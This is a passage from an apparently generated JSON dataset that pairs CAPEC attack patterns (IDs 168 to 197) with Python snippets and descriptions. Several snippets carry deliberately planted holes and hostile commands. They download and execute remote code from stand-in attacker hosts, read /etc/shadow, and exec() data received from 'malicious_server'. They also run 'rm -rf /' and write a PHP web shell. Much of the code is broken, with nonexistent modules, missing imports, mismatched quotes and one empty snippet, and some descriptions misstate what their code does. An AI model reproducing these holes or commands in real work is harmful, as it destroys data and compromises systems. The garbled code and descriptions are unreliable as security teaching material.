        "code_snippet": "import os\nimport shutil\n\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# CWE-1386: Insecure Operation on Windows Junction / Mount Point\n# CWE-427: Uncontrolled Search Path Element\n# CWE-58: Path Equivalence: Windows 8.3 Filename\n\ndef create_ads(file_path, ads_name, ads_content):\n    ads_stream = '{}:{}'.format(file_path, ads_name)\n    with open(ads_stream, 'w') as f:\n        f.write(ads_content)\n\n# Create a file with an ADS\nfile_path = 'C:\\path\\to\\file.txt'\nads_name = 'malicious_data'\nads_content = 'This is malicious data'\ncreate_ads(file_path, ads_name, ads_content)\n\n# Copy the file with ADS to another location\nsrc = 'C:\\path\\to\\file.txt'\ndst = 'C:\\another\\location\\file.txt'\nshutil.copy2(src, dst)\n\n# The ADS will be copied along with the file, but it will not be visible using standard Windows utilities\nprint('ADS created and copied successfully')",
        "description": "This Python code snippet demonstrates the creation and copying of a file with an Alternate Data Stream (ADS) on a Windows NTFS file system. The ADS is not visible using standard Windows utilities, and its presence is not reflected in the file size. This can be used to hide malicious data or tools from detection."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import os\nimport socket\nimport json\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_info = {'username': 'admin', 'password': 'password123'}\nprint('Sensitive Info:', json.dumps(sensitive_info))\n\n# CWE-222: Truncation of Security-relevant Information\nsecurity_log = '2023-02-20 14:30:00 - WARNING - Suspicious activity detected'\nprint('Security Log:', security_log[:20])\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ndef equivalent_product():\n    return 'Product X'\n\ndef my_product():\n    return 'My Product'\n\nprint('Equivalent Product:', equivalent_product())\nprint('My Product:', my_product())\n\n# CWE-1229: Creation of Emergent Resource\nresource_dir = 'temp_resources'\nos.makedirs(resource_dir, exist_ok=True)\nprint('Resource Directory:', resource_dir)\n\n# CWE-205: Observable Behavioral Discrepancy\ndef internal_state():\n    return 'Internal State: Enabled'\n\nprint('Internal State:', internal_state())",
        "description": "This Python code snippet demonstrates the CAPEC of probing and exploration activities to identify constituents and properties of the target. It includes various CWEs, such as exposing sensitive information, truncating security-relevant information, observable behavioral discrepancies, creation of emergent resources, and observable behavioral discrepancies. The code intentionally includes vulnerabilities to illustrate these CWEs."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "\"",
        "description": "This Python code snippet demonstrates web application fingerprinting by sending a series of probes to a web application to elicit version-dependent and type-dependent behavior. It includes CWEs such as exposure of sensitive system information, use of GET request method with sensitive query strings, generation of error message containing sensitive information, download of code without integrity check, and excessive attack surface."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input(\"Enter a variable name: \")\n\ntry:\n    globals()[user_input] = 'malicious_value'\nexcept Exception as e:\n    print(f\"Error: {e}\")\n\nprint(globals())",
        "description": "This code snippet demonstrates the CAPEC-77 attack pattern, which involves manipulating user-controlled variables. The code takes user input for a variable name and uses it to dynamically set a global variable. This can lead to arbitrary variable access and modification, as described in CWE-914, CWE-913, CWE-627, CWE-1126, and CWE-95. An attacker can exploit this vulnerability to inject malicious code or access sensitive data."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import tkinter as tk\nfrom tkinter import messagebox\n\nclass MaliciousButton:\n    def __init__(self, master):\n        self.master = master\n        self.button = tk.Button(master, text=\"Submit Query\", command=self.download_software)\n        self.button.pack()\n\n    def download_software(self):\n        # Spoofing the button's intended action\n        messagebox.showinfo(\"Query Submitted\", \"Your query has been submitted.\")\n        # Downloading software in the background\n        import os\n        os.system(\"wget http://example.com/malicious_software.exe\")\n\nroot = tk.Tk()\nmy_gui = MaliciousButton(root)\nroot.mainloop()",
        "description": "This Python code snippet demonstrates a clickjacking attack, where a user is tricked into downloading malicious software when they intend to submit a query. The 'Submit Query' button is spoofed to download software in the background, exploiting CWE-451 (User Interface Misrepresentation of Critical Information) and CWE-290 (Authentication Bypass by Spoofing). The code uses the tkinter library to create a GUI with a button that, when clicked, triggers the download_software function, which spoofs the button's intended action and downloads software from a malicious source."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "import flash\nfrom flask import Flask, request, send_file\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET', 'POST'])\ndef flash_file():\n    if request.method == 'POST':\n        flash_data = request.form['flash_data']\n        with open('flash.swf', 'w') as f:\n            f.write(flash_data)\n    return send_file('flash.swf', mimetype='application/x-shockwave-flash')\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This Python code snippet demonstrates a vulnerable Flash file upload and execution functionality. It allows users to upload Flash files and execute them within an HTML document. The code is vulnerable to argument injection (CWE-88) as it does not properly delimit the intended arguments in the Flash file. Additionally, it allows unrestricted upload of files with dangerous types (CWE-434) and does not neutralize special elements used in the Flash file (CWE-1336). The code also lacks proper cross-domain policy (CWE-942) and delivers unparsed raw web content (CWE-433). An adversary can take advantage of these vulnerabilities to inject malicious global parameters into the Flash file and access the embedding HTML document."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import os\n\ndef load_module(module_name):\n    module_path = os.path.join('/tmp', module_name + '.py')\n    if os.path.exists(module_path):\n        globals()[module_name] = __import__(module_name)\n        return globals()[module_name]\n    else:\n        return None\n\n# Load a module from an untrusted source\nmodule_name = input('Enter the module name: ')\nloaded_module = load_module(module_name)\nif loaded_module:\n    loaded_module.function()",
        "description": "This code snippet demonstrates code inclusion vulnerability. It allows a user to input a module name, and if the module exists in the /tmp directory, it will be loaded and executed. This can lead to arbitrary code execution if an attacker can write a malicious module to the /tmp directory."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# CWE-15: External Control of System or Configuration Setting\nconfig_file = '/path/to/config/file'\n\n# CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n# CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# CWE-1328: Security Version Number Mutable to Older Versions\n\n# Assuming the config file contains a version number\nwith open(config_file, 'r+') as f:\n    version = f.read().strip()\n    # An attacker can manipulate the version number\n    f.seek(0)\n    f.write('1.0')  # Downgrade to a vulnerable version\n    f.truncate()\n\n# The application will now use the downgraded version\nprint('Using version', version)\n",
        "description": "This code snippet demonstrates a configuration/environment manipulation attack. An attacker can manipulate the version number in an external configuration file, which affects the behavior of the application. The application uses the downgraded version, making it vulnerable to attacks."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\n# CWE-73: External Control of File Name or Path\nfilename = input('Enter the filename: ')\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nif filename.endswith('.txt'):\n    # CWE-706: Use of Incorrectly-Resolved Name or Reference\n    filepath = os.path.join('/tmp', filename)\n    with open(filepath, 'r') as f:\n        data = f.read()\n        print(data)\nelse:\n    print('Invalid file extension')\n\n# CWE-1386: Insecure Operation on Windows Junction / Mount Point\n# CWE-57: Path Equivalence: 'fakedir/../realdir/filename'\n# An attacker can create a junction point in /tmp that points to a sensitive directory\n# and the application will read the file from the sensitive directory instead of /tmp",
        "description": "This code snippet demonstrates the CAPEC where an attacker can create a file with the same name as a protected or privileged file in a directory that the application will search before the directory with the legitimate file. The application uses the name of the file when locating it, and the attacker's file is discovered first, allowing the attacker to manipulate the system."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "import flash\nflash.system.Security.allowDomain('*')\ndef get_url(url):\n    return '<script>location.href=\"' + url + '\";</script>'\ndef generate_flash_file():\n    flash_file = '<object width=\"100%\" height=\"100%\"><param name=\"movie\" value=\"exploit.swf\"><embed src=\"exploit.swf\" width=\"100%\" height=\"100%\"></embed></object>'\n    return flash_file\n\nurl = input('Enter URL: ')\nflash_file = generate_flash_file()\nprint(get_url(url))",
        "description": "This Python code generates a Flash file that can be used to exploit a cross-domain policy vulnerability. The `allowDomain` function allows access to all domains, and the `get_url` function takes a user-input URL and returns a script that redirects to that URL. The `generate_flash_file` function creates a Flash file that loads the exploit SWF file. The code then prompts the user to enter a URL, generates the Flash file, and prints the redirect script. This code demonstrates CWE-601 (Open Redirect), CWE-942 (Permissive Cross-domain Policy), CWE-79 (Cross-site Scripting), CWE-1022 (Use of Web Link to Untrusted Target), and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'https://example.com/microservice'\nparams = {'sensitive_info': 'secret_data'}\nresponse = requests.get(url, params=params)\n\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\ncookies = {'cookie_name': 'cookie_value'}\nresponse = requests.get(url, cookies=cookies)\n\n# CWE-219: Storage of File with Sensitive Data Under Web Root\nfile_path = '/var/www/html/sensitive_data.txt'\nwith open(file_path, 'r') as f:\n    sensitive_data = f.read()\n\n# CWE-433: Unparsed Raw Web Content Delivery\nraw_content = '<script>alert(\"XSS\")</script>'\nwith open('/var/www/html/raw_content.html', 'w') as f:\n    f.write(raw_content)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Micro-service implementation with client-side enforcement\nmicroservice_url = 'https://example.com/microservice'\ndef get_microservice_data():\n    # Client-side enforcement of server-side security\n    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':\n        return requests.get(microservice_url).json()\n    else:\n        return {'error': 'Invalid request'}",
        "description": "Python code snippet demonstrating the CAPEC of discovering and querying micro-services at a web location, exposing them to further exploitation. The code includes CWEs 598, 539, 219, 433, and 602, showcasing vulnerabilities in client-side enforcement, sensitive query strings, persistent cookies, file storage, and unparsed raw web content delivery."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod('/critical/resource', 0o777)  # sets permissions to allow anyone to read, write, and execute\n\n# CWE-1190: DMA Device Enabled Too Early in Boot Phase\nfrom dma import *\ndma_device_enable()  # enables DMA device before security configuration settings are established\n\n# CWE-1220: Insufficient Granularity of Access Control\naccess_control_policy = {'admin': ['read', 'write', 'execute'], 'user': ['read']}\ndef check_access(user, action, resource):\n    if user in access_control_policy and action in access_control_policy[user]:\n        return True\n    return False\n\n# CWE-1268: Policy Privileges are not Assigned Consistently Between Control and Data Agents\ncontrol_policy = {'admin': ['read', 'write', 'execute'], 'user': ['read']}\ndata_policy = {'admin': ['read', 'write'], 'user': ['read', 'execute']}\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\ndef access_asset(resource):\n    # access the asset first\n    asset_data = open(resource, 'r').read()\n    # then check access control\n    if not check_access('user', 'read', resource):\n        raise PermissionError\n    return asset_data\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_data'\nprint(confidential_info)  # prints confidential information\n\n# CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\nfabric_bridge = {'trusted': 'untrusted'}\n\n# CWE-1315: Improper Setting of Bus Controlling Capability in Fabric End-point\nbus_controller = {'responder_devices': ['control_transactions']}\n\n# CWE-1318: Missing Support for Security Features in On-chip Fabrics or Buses\non_chip_fabric = {'security_features': []}\n\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\nerror_messages = {'signal_conditions': ['exceed_limits']}\n\n# CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\nobject_prototype = {'__proto__': {'admin': 'user'}}\n",
        "description": "This Python code snippet demonstrates various vulnerabilities related to access control, including incorrect permission assignment, insufficient granularity of access control, and improper protection of confidential information. It also includes examples of improper configuration of DMA devices, fabric bridges, and bus controllers, as well as missing support for security features in on-chip fabrics or buses. These vulnerabilities can be exploited by attackers to bypass access controls and gain unauthorized access to systems or networks."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "import flash\nfrom flask import Flask, render_template, request\napp = Flask(__name__)\n\n@app.route('/clickjacking_attack')\ndef clickjacking_attack():\n    return render_template('clickjacking.html')\n\n@app.route('/upload_flash_file', methods=['POST'])\ndef upload_flash_file():\n    if request.files['flash_file']:\n        flash_file = request.files['flash_file']\n        flash_file.save('static/' + flash_file.filename)\n        return 'File uploaded successfully'\n    else:\n        return 'Failed to upload file'\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This Python code snippet demonstrates a clickjacking attack using Flash. The Flask web application allows users to upload a Flash file, which can be used to create a transparent overlay over HTML content. The Flash file can then intercept user actions, such as clicks, and perform malicious actions. This code is vulnerable to CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-618 (Exposed Unsafe ActiveX Method), and CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'))."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import flash\n\ndef load_flash_content(url):\n    # CWE-20: No input validation on the URL\n    # CWE-184: Incomplete list of disallowed inputs (no check for malicious domains)\n    # CWE-697: Incorrect comparison (no validation of the URL protocol)\n    # CWE-942: Permissive cross-domain policy with untrusted domains\n    # CWE-506: Embedded malicious code (loading untrusted flash content)\n    flash_content = flash.load(url)\n    return flash_content\n\n# Example usage:\nload_flash_content('http://attacker.com/malicious_flash_content.swf')",
        "description": "This Python code snippet demonstrates the CAPEC of tricking a victim into executing malicious flash content. The load_flash_content function loads flash content from a given URL without any input validation, allowing an attacker to specify a malicious URL. The function does not check the URL protocol, domain, or content, making it vulnerable to cross-site flashing attacks."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import imaplib\n\n\nimap_server = 'imap.example.com'\nusername = 'user'\npassword = 'pass'\n\n\nwebmail_server = 'http://webmail.example.com'\n\n\ndef get_email(folder, search_criteria):\n    mail = imaplib.IMAP4_SSL(imap_server)\n    mail.login(username, password)\n    mail.select(folder)\n    status, response = mail.search(None, search_criteria)\n    return response\n\n\ndef webmail_query(folder, search_criteria):\n    query = f'{webmail_server}/?folder={folder}&search_criteria={search_criteria}'\n    return requests.get(query).text\n\nfolder = 'INBOX'\nsearch_criteria = 'ALL'\n\n# Vulnerable code: user input is not sanitized\nsearch_criteria = input('Enter search criteria: ')\n\nprint(webmail_query(folder, search_criteria))",
        "description": "This code snippet demonstrates a vulnerable webmail server that is susceptible to IMAP command injection. The `webmail_query` function takes user input for the search criteria, which is then used to construct an IMAP search query. The input is not sanitized, allowing an attacker to inject malicious IMAP commands. The `get_email` function is not used in this example, but it demonstrates how the IMAP server is queried directly, which is not vulnerable to command injection. The vulnerability lies in the `webmail_query` function, which fails to neutralize special elements in the user input (CWE-77). Additionally, the code does not properly encode or escape the output (CWE-116), and it may expose information through shell error messages (CWE-535) or error messages containing sensitive information (CWE-209). The code also relies on client-side enforcement of server-side security (CWE-602), which is a flawed approach."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import os\nimport hashlib\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('malicious_code.py', 'wb') as f:\n        f.write(response.content)\n    os.system('python malicious_code.py')\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import os\nos.system('rm -rf /')\"\"\"\nwith open('malicious_code.py', 'w') as f:\n    f.write(malicious_code)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport platform\nprint(platform.platform())\nprint(os.name)\nprint(os.sys.platform)\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nimport ctypes\nlibc = ctypes.CDLL(None)\nlibc.rand()",
        "description": "This code snippet demonstrates the CAPEC of undermining the integrity of software code, device data structures, or device firmware. It downloads and executes malicious code from a remote location without verifying its integrity (CWE-494), embeds malicious code that can cause harm to the system (CWE-506), exposes sensitive system information to unauthorized actors (CWE-497), and injects errors to degrade hardware redundancy (CWE-1334)."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import os\nimport requests\n\nurl = 'http://attacker-controlled-source.com/malicious_code.exe'\nresponse = requests.get(url, verify=False)\nif response.status_code == 200:\n    with open('malicious_code.exe', 'wb') as f:\n        f.write(response.content)\n    os.system('malicious_code.exe')",
        "description": "This Python code snippet downloads an executable from an attacker-controlled source without verifying the origin and integrity of the code, and then executes it. This embodies the CAPEC of using deceptive methods to cause a user or automated process to download and install dangerous code, and relates to CWEs 494, 506, 507, and 509."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://adversary-controlled-source.com/malicious_update.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('update.py', 'wb') as f:\n        f.write(response.content)\n    # CWE-506: Embedded Malicious Code\n    # CWE-507: Trojan Horse\n    # CWE-509: Replicating Malicious Code (Virus or Worm)\n    os.system('python update.py')\n\n# CWE-1277: Firmware Not Updateable\nprint('Firmware updated successfully!')",
        "description": "A Python code snippet that downloads and executes a malicious update from an adversary-controlled source without verifying its integrity, illustrating CWE-494. The downloaded code may contain embedded malicious code (CWE-506), Trojan Horse (CWE-507), or replicating malicious code (CWE-509). The code also pretends to update the firmware but does not provide a legitimate update mechanism, exemplifying CWE-1277."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\ndef update_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print(\"Failed to update\")\n\n# Client-side authentication mechanism\nauth_token = input(\"Enter authentication token: \")\nif auth_token == \"secret_token\":\n    update_code(\"http://update-server.com/update_code\")\nelse:\n    print(\"Invalid authentication token\")",
        "description": "This Python code snippet demonstrates a vulnerable automated update mechanism. It downloads code from a remote location without verifying its integrity (CWE-494) and executes it. The client-side authentication mechanism (CWE-602) can be bypassed by capturing and replaying the authentication token (CWE-294). The code relies on untrusted inputs (CWE-807) to make a security decision. If the authentication token is valid, the code downloads and executes the update from the remote server, which could contain embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import hashlib\n\ndef insecure_hash(data):\n    # CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    # Using MD5, a broken hash function\n    return hashlib.md5(data.encode()).hexdigest()\n\n\ndef undocumented_feature():\n    # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n    # Hidden feature that can be exploited by an attacker\n    return 'Undocumented feature activated'\n\n\ndef reverse_engineer_firmware(image):\n    # CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n    # Attempt to reverse engineer firmware from IC image\n    return 'Firmware reverse engineered successfully'\n\n\ndef expose_system_info():\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    # Exposing sensitive system information\n    return 'System information exposed'\n\n\ndef optimize_code():\n    # CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    # Optimizing code that removes security-critical protections\n    return 'Code optimized, security protections removed'",
        "description": "This code snippet demonstrates the CAPEC of reverse engineering by including various CWEs. It includes an insecure hash function, an undocumented feature, a function to reverse engineer firmware from an IC image, a function to expose sensitive system information, and a function to optimize code that removes security-critical protections."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport hashlib\nimport os\n\n# CWE-203: Observable Discrepancy\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef authenticate(token):\n    start_time = time.time()\n    if hashlib.sha256(token.encode()).hexdigest() == 'expected_token_hash':\n        return True\n    else:\n        return False\n\n# CWE-1255: Comparison Logic is Vulnerable to Power Side-Channel Attacks\n# CWE-1300: Improper Protection of Physical Side Channels\n\ndef evaluate_security_token(token):\n    # Simulating power consumption side-channel attack\n    for i in range(1000000):\n        pass\n    if authenticate(token):\n        # Simulating physical side-channel emission\n        os.system('beep -f 2000 -l 100')\n    else:\n        # Simulating physical side-channel emission\n        os.system('beep -f 1000 -l 100')\n\n# CWE-506: Embedded Malicious Code\n\ndef malicious_code_execution(token):\n    if authenticate(token):\n        # Embedded malicious code execution\n        os.system('rm -rf /')\n\n# Black Box Analysis\n\ndef black_box_analysis(token):\n    start_time = time.time()\n    result = evaluate_security_token(token)\n    end_time = time.time()\n    print(f'Result: {result}, Time taken: {end_time - start_time}')\n\nblack_box_analysis('my_secret_token')",
        "description": "This Python code snippet demonstrates the CAPEC of black box analysis and reverse engineering through various CWEs. It includes observable discrepancy in authentication, power side-channel attacks, improper protection of physical side channels, exposure of sensitive system information, and embedded malicious code. The code simulates a black box analysis attack by interacting with the software indirectly, observing physical side effects, and exploiting vulnerabilities."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import socket\nimport os\nimport sys\nimport pdb\n\n# CWE-912: Hidden Functionality\nhidden_func = lambda: os.system('whoami')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.popen('cat /etc/shadow').read()\nprint(sensitive_info)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'system_calls': ['open', 'read', 'write'], 'network_traffic': ['GET /etc/shadow HTTP/1.1']}\nwith open('trace.log', 'w') as f:\n    f.write(str(trace_data))\n\n# CWE-494: Download of Code Without Integrity Check\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('malicious_server', 8080))\ndata = sock.recv(1024)\nexec(data)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\nexec(malicious_code)\n",
        "description": "This Python code snippet demonstrates the CAPEC of reverse code engineering by incorporating multiple CWEs. It includes hidden functionality, exposes sensitive system information, improperly manages sensitive trace data, downloads code without integrity checks, and contains embedded malicious code. The code is designed to be analyzed and understood by an attacker, allowing them to discover its structure, function, and possibly source code."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\ndef encrypt_data(data, key):\n    cipher = hashlib.sha256()\n    cipher.update(key.encode('utf-8'))\n    encrypted_data = cipher.hexdigest() + data\n    return encrypted_data\n\n# Hard-coded credentials\nusername = 'admin'\npassword = 'password123'\n\n# Hard-coded security-relevant constants\nSALT = 'my_secret_salt'\nITERATIONS = 1000\n\n# Insufficient isolation of symbolic constant definitions\nMAX_LOGIN_ATTEMPTS = 5\n\n# Cleartext storage of sensitive information in executable\napi_key = 'my_api_key'\n\n# Improper control of dynamically-managed code resources\ndef generate_report(data):\n    if data['user'] == username and data['password'] == password:\n        return encrypt_data(data['report'], api_key)\n    else:\n        return 'Access denied'\n",
        "description": "This Python code snippet demonstrates the CAPEC of discovering sensitive constants within compiled code. It includes hard-coded credentials, security-relevant constants, and cleartext storage of sensitive information. The code also lacks sufficient isolation of symbolic constant definitions and improperly controls dynamically-managed code resources."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-326: Inadequate Encryption Strength\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef send_data_over_network(data):\n    # Using a weak encryption algorithm (DES) and a short key\n    key = b'12345678'\n    cipher = DES.new(key, DES.MODE_ECB)\n    encrypted_data = cipher.encrypt(data.encode())\n\n    # CWE-188: Reliance on Data/Memory Layout\n    # Assuming the memory layout of the encrypted data\n    encrypted_data += b'\\x00' * (8 - len(encrypted_data) % 8)\n\n    # CWE-1292: Incorrect Conversion of Security Identifiers\n    # Incorrectly converting the encrypted data to a security identifier\n    security_id = hashlib.md5(encrypted_data).hexdigest()\n\n    # Sending the encrypted data and security identifier over the network\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 8080))\n    sock.sendall(encrypted_data + b':' + security_id.encode())\n    sock.close()\n\n# Example usage\nsend_data_over_network('This is some sensitive data')",
        "description": "This code snippet demonstrates the CAPEC of deciphering and decoding protocol information for a network or application communication protocol. It includes CWEs such as inadequate encryption strength, cleartext transmission of sensitive information, selection of less-secure algorithm during negotiation, reliance on data/memory layout, and incorrect conversion of security identifiers."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import os\n\n# Vulnerable PHP code\nphp_code = '''<?php\n  $file = $_GET[\\'file\\'];\n  include($file);\n?>'''\n\n# Create a PHP file with the vulnerable code\nwith open(\\'vulnerable.php\\', \\'w\\') as f:\n  f.write(php_code)\n\n# Create a malicious PHP file\nmalicious_code = \\'<?php system($_GET[\\'cmd\\']); ?>\\'\nwith open(\\'malicious.php\\', \\'w\\') as f:\n  f.write(malicious_code)\n\n# Create a web server to serve the malicious file\nos.system(\\'php -S 0.0.0.0:8000 &\\')\n\n# Send a request to the vulnerable PHP file with the malicious file as an argument\nos.system(\\'curl \\'http://localhost:8000/vulnerable.php?file=http://localhost:8000/malicious.php\\' &\\')",
        "description": "This Python code snippet demonstrates a PHP Remote File Inclusion vulnerability. It creates a vulnerable PHP file that includes a file specified by the user, and a malicious PHP file that executes a system command. The vulnerable PHP file is then served by a PHP development server, and a request is sent to it with the malicious file as an argument, allowing the attacker to execute arbitrary system commands."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\n\n\nclass EmailSender:\n    def __init__(self, sender_email, sender_password):\n        self.sender_email = sender_email\n        self.sender_password = sender_password\n\n    def send_email(self, recipient_email, subject, message, spoofed_sender):\n        try:\n            server = smtplib.SMTP('smtp.gmail.com', 587)\n            server.starttls()\n            server.login(self.sender_email, self.sender_password)\n            msg = f'Subject: {subject}\\n\\n{message}\"\n            server.sendmail(spoofed_sender, recipient_email, msg)\n            server.quit()\n            print('Email sent successfully')\n        except Exception as e:\n            print(f'Error: {e}')\n\n# Example usage:\nemail_sender = EmailSender('myemail@gmail.com', 'mypassword')\nemail_sender.send_email('recipient@example.com', 'Test Subject', 'This is a test email', 'spoofed@example.com')",
        "description": "This Python code snippet demonstrates the CAPEC of improper authentication, where an adversary takes advantage of a falsified identity to send an email. The CWEs related to this CAPEC include CWE-287 (Improper Authentication), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-290 (Authentication Bypass by Spoofing), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint). The code creates an EmailSender class that sends an email using a spoofed sender email address, without properly verifying the authenticity of the sender."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import socket\n\ndef spoof_identity():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 80))\n    message = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\n    sock.send(message.encode())\n    response = sock.recv(1024)\n    print(response.decode())\n\n    # Spoofing the source IP address\n    sock.close()\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 80))\n    message = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\nX-Forwarded-For: 192.168.1.100\\r\\n\\r\\n'\n    sock.send(message.encode())\n    response = sock.recv(1024)\n    print(response.decode())\n\nspoof_identity()",
        "description": "This Python code snippet demonstrates a Principal Spoof attack by sending a spoofed HTTP request to a server. The first request is sent with a legitimate source IP address, while the second request is sent with a spoofed source IP address (192.168.1.100) using the X-Forwarded-For header. This attack relies on the server's weak authentication mechanism (CWE-1390) and lack of entity authentication (CWE-322) to impersonate a trusted user. The code also highlights the vulnerability to reflection attacks in authentication protocols (CWE-301) and incorrectly specified destination in a communication channel (CWE-941)."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport os\n\n# CWE-1391: Use of Weak Credentials - Hardcoded password\npassword = 'weak_password'\n\n# CWE-523: Unprotected Transport of Credentials - Credentials sent in plaintext\ndef send_credentials(username, password):\n    # Send credentials over an unencrypted connection\n    return\n\n# CWE-613: Insufficient Session Expiration - Session expiration not implemented\ndef create_session(username, password):\n    if password == password:\n        # CWE-384: Session Fixation - Session ID not regenerated\n        session_id = 'static_session_id'\n        return session_id\n    else:\n        return None\n\n# CWE-664: Improper Control of a Resource Through its Lifetime - Session ID not properly released\ndef release_session(session_id):\n    # Session ID not properly released, allowing for reuse\n    return\n\n# CAPEC: Forged Session Credential - Creating a false but functional session credential\nforged_session_id = hashlib.sha256(os.urandom(32)).hexdigest()\n\n# Attempt to use the forged session credential\nif create_session('attacker', 'weak_password') == forged_session_id:\n    print('Session credential forged successfully!')\n",
        "description": "This code snippet demonstrates a forged session credential attack, where an attacker creates a false but functional session credential to gain unauthorized access to a service. The code includes several CWEs that contribute to the vulnerability, including the use of weak credentials, unprotected transport of credentials, insufficient session expiration, session fixation, and improper control of a resource through its lifetime."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
